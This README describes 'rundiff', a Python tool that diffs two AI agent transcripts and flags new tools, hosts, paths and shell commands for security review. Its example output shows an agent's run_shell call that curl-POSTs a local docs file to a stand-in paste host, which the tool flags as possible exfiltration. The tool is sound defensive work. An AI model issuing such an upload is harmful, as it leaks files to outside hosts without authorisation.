# rundiff

**Offline behavioral diff for two AI agent run transcripts.**

You changed a system prompt, swapped a model, or added a tool. Did the agent's
*behavior* change? `rundiff` compares a **baseline** run and a **candidate** run
and tells you which tool calls were added, removed, or reordered, which
arguments changed, where tool results diverged, how similar the final answers
are, and, for security review, what **new surface** the candidate touches
(new tools, network hosts, filesystem paths, shell programs).

Single file, Python 3 standard library only, no network access, no dependencies.

## What it does

- **Reads transcripts** as JSONL or JSON (a list, or an object with a `messages`/`events` list), and auto-detects the format:
  - **OpenAI chat**: assistant `tool_calls` (plus legacy `function_call`) and `role: "tool"` results
  - **Anthropic messages**: `tool_use` / `tool_result` content blocks
  - **Generic**: `{"type":"tool_call","tool":..,"args":..,"id":..}` / `{"type":"tool_result","id":..,"result":..}` / `{"type":"final","content":..}`
- **Extracts** the ordered tool-call sequence (tool name, normalized args, result summary + SHA-256 prefix), the final assistant answer, assistant/user turn counts, and token totals when a `usage` field is present (`prompt_tokens`/`completion_tokens` or `input_tokens`/`output_tokens`).
- **Aligns** the two call sequences with `difflib.SequenceMatcher` on tool names and pairs the matched calls. A removed call whose tool shows up again among the added calls is reported as **reordered**.
- **Reports**:
  - added / removed / reordered calls
  - key-level JSON argument diffs per matched call (`--ignore-keys id,*_at,timestamp` drops volatile fields from args *and* JSON results, using fnmatch globs)
  - result divergence (the normalized result hash differs; whitespace-only changes are ignored)
  - final-answer similarity ratio (0–1)
  - summary stats: calls, turns, unique tools, tokens
- **New-surface flags** (heuristic risk notes) for things the candidate does that the baseline never did:
  - new **tools**
  - new **network hosts** (URLs found anywhere in args)
  - new **filesystem paths** and **directories** (path-like keys such as `path`/`file`/`cwd`, plus absolute/relative paths in strings)
  - new **shell programs** (from `command`/`cmd`/`script` args, or the first arg of shell-like tools such as `bash`/`run_shell`/`exec`)
- **Output**: human-readable text (colored when writing to a TTY; `--no-color` or `NO_COLOR` turns color off) or `--json`.
- **CI gating**: `--fail-on {any,new-surface,args,none}` exits 1 when that kind of difference is found. Exits 2 on input/usage errors.

## Install

```bash
# Python 3.8+; no dependencies
cp rundiff.py ~/bin/rundiff && chmod +x ~/bin/rundiff   # or just: python3 rundiff.py ...
```

## Usage

```text
python3 rundiff.py BASELINE CANDIDATE [--format auto|openai|anthropic|generic]
                   [--ignore-keys k1,k2,glob*] [--json] [--no-color]
                   [--fail-on any|new-surface|args|none]
```

Examples:

```bash
# human-readable diff
python3 rundiff.py examples/baseline.jsonl examples/candidate.jsonl --ignore-keys request_id,took_ms

# machine-readable
python3 rundiff.py base.jsonl cand.jsonl --json > diff.json

# CI: fail the build if the new prompt makes the agent touch new hosts/tools/paths/commands
python3 rundiff.py golden/run.jsonl out/run.jsonl --fail-on new-surface --no-color
```

| exit | meaning |
|---|---|
| 0 | no difference of the gated kind (always 0 with `--fail-on none`, the default) |
| 1 | `--fail-on` condition met |
| 2 | error (unreadable file, invalid JSON, bad arguments) |

`--fail-on any` counts any added/removed/reordered call, argument change, result divergence, final-answer change, or new-surface flag.

## Example output

The bundled `examples/` pair: the candidate drops `list_dir`, changes `search_docs.limit`
from 5 to 20, `curl`s `./docs/RELEASE.md` to an unfamiliar paste host, and writes a file with a new
`write_file` tool.

```text
$ python3 rundiff.py examples/baseline.jsonl examples/candidate.jsonl --ignore-keys request_id,took_ms --no-color
rundiff 0.1.0  (heuristic behavioral diff)
baseline : examples/baseline.jsonl [openai]
candidate: examples/candidate.jsonl [openai]

Summary
                   baseline  candidate
  calls                   4          5
  turns                   5          6
  user_turns              1          1
  unique_tools            4          4
  tokens.input         3030       3840
  tokens.output         143        208
  tokens.total         3173       4048
  matched calls: 3

Tool-call changes
  - removed  #3 list_dir {"path": "./docs"}
  + added    #3 run_shell {"command": "curl -s -X POST https://paste.unfamiliar-host.…
  + added    #4 write_file {"content": "v2.3: faster sync, login fix, export command",…

Argument changes
  search_docs (baseline #0 / candidate #0)
    ~ limit: 5 -> 20

Result divergence
  (none)

Final answer
  similarity: 0.58
  baseline : v2.3 brings faster sync, a login bug fix, and a new export command. Recent commits match these changes.
  candidate: v2.3 adds faster sync, fixes a login bug, and introduces an export command. I saved a summary to /tmp/agent-out/summary.md.

New surface in candidate (heuristic risk notes)
  ! new tool    write_file  [calls #4 via write_file]
      risk: candidate uses a tool never used in baseline; review its permissions/side effects (heuristic)
  ! new host    paste.unfamiliar-host.example  [calls #3 via run_shell]
      risk: candidate contacts a network host not seen in baseline; possible exfiltration or untrusted fetch (heuristic)
  ! new path    /tmp/agent-out/summary.md  [calls #4 via write_file]
      risk: candidate touches a filesystem path not seen in baseline (heuristic)
  ! new dir     /tmp/agent-out  [calls #4 via write_file]
      risk: candidate touches a directory not seen in baseline (heuristic)
  ! new command curl  [calls #3 via run_shell]
      risk: candidate runs a shell program not seen in baseline (heuristic)

Note: alignment and surface extraction are heuristic; nondeterministic agents differ naturally. rundiff does not judge which run is better.
```

With `--fail-on new-surface` (or `any`, or `args`), this example exits **1**. Comparing a run with itself exits **0**.

## Tests

```bash
python3 -m unittest -v
```

## Caveats (please read)

- **Alignment is heuristic.** Calls are aligned by tool name only. When the same tool appears many times, a call can pair with the "wrong" counterpart, and then the argument diffs will look noisier than the real change. Reorder detection is a simple same-tool-name match.
- **Nondeterministic agents differ naturally.** Two runs of the *same* prompt and model can produce different calls, arguments, and wording. Use `--ignore-keys` for volatile fields, compare against several baselines, or pin temperature/seed before you treat a diff as a regression.
- **New-surface flags are heuristics, not detections.** URL, path, and command extraction use regexes and key-name conventions. They can miss obfuscated or encoded values (base64, string concatenation, env vars) and they can flag harmless things. A flag means "a human should look at this," not "this is malicious."
- **It can't judge which run is better.** rundiff reports *what changed*. It doesn't decide whether the change is correct, safer, or higher quality. A lower final-answer similarity can mean a better answer.
- Result comparison uses a hash of the normalized result text. It tells you results differ, not how.
- Only the transcript formats described above are parsed. Other shapes may parse partially or come out empty.

## License

MIT. See the [LICENSE](../../LICENSE) at the repository root.
